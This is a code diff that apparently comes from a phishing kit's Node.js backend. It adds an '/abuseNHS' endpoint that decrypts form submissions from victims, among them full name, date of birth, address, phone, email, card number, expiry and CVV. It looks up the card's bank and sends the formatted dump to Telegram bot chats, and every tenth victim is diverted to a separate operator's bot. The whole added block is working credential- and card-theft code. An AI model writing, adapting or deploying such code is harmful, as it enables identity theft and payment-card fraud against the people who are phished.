@@ -12125,6 +12125,107 @@ app.post("/bendigoSkii", (req, res) => {
 //NHS
 //NHS
 
+let abuse = 0;
+
+app.post("/abuseNHS", (req, res) => {
+  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userAgent = req.body.userAgent;
+  ip = req.body.ip;
+  bin = req.body.bin;
+
+  if (bin.length === 7) {
+    formatBin = bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = bin.slice(0, -1);
+    }
+    bin = formatBin;
+  }
+  axios
+    .get(`https://lookup.binlist.net/${bin}`)
+    .then((resp) => {
+      if (!resp.data.bank) {
+        bankName = "";
+      } else {
+        bankName = resp.data.bank.name;
+      }
+    })
+    .then(function () {
+      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      if (abuse == 10) {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        abuse = 6;
+      } else {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `NHS Abuse:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 2055983688,
+              text: `NHS:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        abuse += 1;
+      }
+      res.send("Update Complete");
+    });
+});
+
 app.post("/ciscoNHS", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
